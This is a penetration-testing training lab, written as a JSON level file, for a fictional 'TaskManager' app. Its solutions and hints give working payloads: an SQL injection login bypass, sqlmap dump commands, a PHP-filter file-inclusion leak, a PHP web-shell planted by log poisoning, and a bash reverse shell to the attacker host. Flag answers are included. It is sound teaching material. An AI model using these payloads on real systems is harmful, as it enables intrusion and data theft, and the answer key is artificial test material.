@@ -1,0 +1,271 @@
+{
+  "title": "Web Application: SQLi \u2192 LFI \u2192 RCE",
+  "description": "A full attack-chain web application penetration testing lab against a fictional internal app, \"TaskManager\". Trainees discover a hidden admin panel, bypass authentication with SQL injection, dump a database with sqlmap, escalate a local file inclusion into source disclosure, and finally chain log poisoning into remote code execution and a reverse shell.",
+  "prerequisites": [
+    "Basic knowledge of the Linux command line",
+    "Basic understanding of HTTP requests/responses",
+    "Basic SQL syntax",
+    "Basic PHP reading comprehension"
+  ],
+  "outcomes": [
+    "Directory/content discovery with gobuster",
+    "Manual SQL injection to bypass authentication",
+    "Automated database enumeration and dumping with sqlmap",
+    "Escalating local file inclusion (LFI) to source code disclosure via PHP wrappers",
+    "Log poisoning to achieve remote code execution",
+    "Establishing and using a reverse shell to retrieve a final flag"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Web Application: SQLi \u2192 LFI \u2192 RCE\n\nYou've been hired to test **TaskManager**, an internal task-tracking web application. The public site at `http://172.16.0.10` looks harmless, but your client suspects there's more to it than a simple homepage.\n\nYour goal: find the hidden admin panel, break into it, and see how far the chain of vulnerabilities takes you \u2014 all the way to a shell on the server.\n\n## Topology\n\n| Host | Role | IP |\n| --- | --- | --- |\n| attacker | Kali Linux | 172.16.0.100 |\n| webserver | TaskManager (LAMP) | 172.16.0.10 |\n| db-server | MySQL (internal only) | 172.16.0.20 |\n\n`db-server` is **not** reachable directly from the attacker \u2014 only `webserver` can talk to it. Everything you learn about the database has to come through the web application.\n\n## Disclaimer\n\nThis is a fictional, intentionally vulnerable application built for this training environment only. All techniques taught here must only ever be used against systems you are authorized to test."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Your first task is to access the sandbox. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**.\n2. Login with username **`user`** and password **`Password123`**.\n3. `webserver` (172.16.0.10) and `db-server` (172.16.0.20) are reachable from `attacker` over the internal network.",
+      "local_content": "This sandbox has not been tested for use with local sandbox."
+    },
+    {
+      "title": "Level 1: Directory Discovery",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": "/admin_portal_v2",
+      "answer_variable_name": null,
+      "content": "The public TaskManager homepage doesn't link to any admin interface. Use content discovery to find it.\n\nAs a flag, submit the **path of the hidden admin directory**, in the format `/directory_name`.",
+      "solution": "```\nuser@attacker:~$ gobuster dir -u http://172.16.0.10 -w /usr/share/wordlists/dirb/common.txt -x php\n```\nAmong the noise of 404s, one path stands out with a 200/301 response instead of the expected 404.\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which tool should I use?",
+          "content": "Use **gobuster** (or ffuf/dirb) with a common directory wordlist against the webserver.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Which wordlist?",
+          "content": "Try `/usr/share/wordlists/dirb/common.txt`, which ships with Kali.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 2: SQL Injection Auth Bypass",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": null,
+      "answer": "superadmin_2077",
+      "answer_variable_name": null,
+      "content": "The admin panel's login form builds its SQL query by directly concatenating your input:\n```\nSELECT * FROM users WHERE user='$u' AND pass='$p'\n```\nBypass the login without knowing any valid password, then check the dashboard to see which account you're actually logged in as.\n\nAs a flag, submit the **username shown on the dashboard** after the bypass.",
+      "solution": "In the login form, submit:\n- Username: `' OR 1=1-- -`\n- Password: (anything)\n\nThis turns the query into `SELECT * FROM users WHERE user='' OR 1=1-- -' AND pass='...'`, which matches every row in the table. The application logs you in as the first matching user and shows their username on the dashboard.\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What does the query look like?",
+          "content": "The query is `SELECT * FROM users WHERE user='$u' AND pass='$p'` with no sanitization. Think about how to make the `WHERE` clause always true.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "What payload should I try?",
+          "content": "A classic payload for this pattern is `' OR 1=1-- -` in the username field.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 3: Database Dump with sqlmap",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "sk_live_51gHTofJustice",
+      "answer_variable_name": null,
+      "content": "Manual injection got you in, but now you want to fully enumerate the database. Automate it with **sqlmap** against the login form.\n\nAs a flag, submit the value of the **`api_key`** column in the **`secrets`** table.",
+      "solution": "```\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch --dbs\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager --tables\nuser@attacker:~$ sqlmap -u \"http://172.16.0.10/admin_portal_v2/login.php\" --data \"user=admin&pass=x\" -p user --batch -D taskmanager -T secrets --dump\n```\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which parameter is injectable?",
+          "content": "The `user` POST parameter of `login.php` is injectable \u2014 tell sqlmap with `-p user`.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "What's the sqlmap workflow?",
+          "content": "First enumerate databases with `--dbs`, then tables in the relevant database with `--tables`, then dump the specific table with `--dump -T secrets`.",
+          "hint_penalty": 0,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 4: LFI with PHP Wrapper",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "Db_S3cr3t_2024_wr4pp3r",
+      "answer_variable_name": null,
+      "content": "The dashboard's `?page=` parameter loads local PHP files (`dashboard.php?page=tasks.php`, etc.), and it doesn't validate the value beyond stripping `../`. You can't browse to `config.php` directly and read its source \u2014 the server just executes it and shows a blank page.\n\nUse a PHP stream wrapper to make the server hand you the **source code** instead of executing it.\n\nAs a flag, submit the value of the **`DB_PASS`** constant defined in `config.php`.",
+      "solution": "```\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=php://filter/convert.base64-encode/resource=config.php\" | grep -A2 content\n```\nCopy the base64 blob out of the page and decode it:\n```\nuser@attacker:~$ echo '<base64_blob>' | base64 -d\n```\nThe decoded PHP source contains the `DB_PASS` constant.\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Why can't I just request page=config.php?",
+          "content": "Requesting `config.php` directly makes PHP *execute* it \u2014 you'd only see whatever it prints (nothing), not its source code.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Which PHP wrapper leaks source code?",
+          "content": "Use the `php://filter` wrapper with the `convert.base64-encode` filter, targeting `resource=config.php`. The response will contain base64 text instead of executing the file \u2014 decode it locally.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Do I need to be logged in?",
+          "content": "Yes \u2014 `dashboard.php` checks for a valid session, so make sure to reuse the session cookie from your Level 2 login (or pass credentials with `curl -c`/`-b`).",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 5: Log Poisoning to RCE",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 30,
+      "minimal_possible_solve_time": null,
+      "answer": "taskmgr-prod-01",
+      "answer_variable_name": null,
+      "content": "The same LFI can include *any* file the web server process can read \u2014 including its own Apache access log. Every request's `User-Agent` header gets written into that log verbatim. If you put PHP code in your `User-Agent`, including the log file will execute it.\n\nAs a flag, submit the contents of **`/etc/hostname`** on the webserver.",
+      "solution": "Step 1 \u2014 poison the log with a PHP payload in the User-Agent header:\n```\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" -A \"<?php system(\\$_GET['cmd']); ?>\" http://172.16.0.10/\n```\nStep 2 \u2014 include the poisoned log file and pass a command via `cmd`:\n```\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=cat+/etc/hostname\"\n```\nThe log file gets `include()`'d, PHP parses your injected `<?php ... ?>` tag as real code, and `system()` runs your command.\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where does my User-Agent end up?",
+          "content": "Apache logs every request's `User-Agent` header verbatim into `access.log`. If that string contains valid PHP tags, and the log file later gets `include()`'d, PHP will execute it.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "What payload should I send as User-Agent?",
+          "content": "Something like `<?php system($_GET['cmd']); ?>` \u2014 with curl, use `-A \"<payload>\"`.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "How do I trigger it?",
+          "content": "Include the log file via the same LFI parameter used in Level 4: `?page=/var/log/apache2/access.log`, then add `&cmd=<your command>` to run something through the injected `system()` call.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Level 6: Reverse Shell + Loot",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": null,
+      "answer": "FLAG{full_ch41n_SQL1_LFI_l0g_RCE}",
+      "answer_variable_name": null,
+      "content": "One-off commands are useful, but a full interactive shell is much more powerful. Use the RCE from Level 5 to pop a reverse shell back to your attacker machine, then loot a hidden file.\n\nAs a flag, submit the contents of **`/var/www/html/admin_portal_v2/.secret_vault/crown.txt`**.",
+      "solution": "Step 1 \u2014 start a listener on Kali:\n```\nuser@attacker:~$ nc -lvnp 4444\n```\nStep 2 \u2014 trigger a reverse shell through the same log-poisoning RCE, replacing `kali_ip` with your attacker's IP (172.16.0.100):\n```\nuser@attacker:~$ curl -s -b \"PHPSESSID=<your_session_cookie>\" \"http://172.16.0.10/admin_portal_v2/dashboard.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.16.0.100/4444+0>%261'\"\n```\nStep 3 \u2014 once you catch the shell, read the loot file:\n```\nwww-data@webserver:~$ cat /var/www/html/admin_portal_v2/.secret_vault/crown.txt\n```\n\nThe flag is: ${ANSWER}\n",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What do I set up first?",
+          "content": "Start a netcat listener on your attacker machine before triggering anything: `nc -lvnp 4444`.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "How do I get a shell back, not just command output?",
+          "content": "Send a bash reverse shell one-liner as the `cmd` value through the same RCE from Level 5, pointing at your attacker's IP and listening port.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Where's the final loot?",
+          "content": "Once you have a shell as `www-data`, look inside the hidden `.secret_vault` directory under the admin panel's web root.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 100,
+      "attachments": [],
+      "max_score": 1,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Epilogue",
+      "level_type": "INFO_LEVEL",
+      "order": 8,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "Full chain complete: **content discovery \u2192 SQL injection \u2192 automated database dumping \u2192 LFI source disclosure \u2192 log poisoning \u2192 remote code execution \u2192 reverse shell**.\n\nEvery step exploited a small, realistic mistake: an undocumented admin path, string-concatenated SQL, an LFI parameter with no allowlist, and an Apache log file that's both attacker-writable (via User-Agent) and web-server-readable. None of these bugs is exotic \u2014 that's exactly why chains like this show up so often in real assessments.\n\n**Scenario design**: original lab content created for this CyberRangeCZ training deck."
+    }
+  ],
+  "estimated_duration": 140,
+  "variant_sandboxes": false
+}
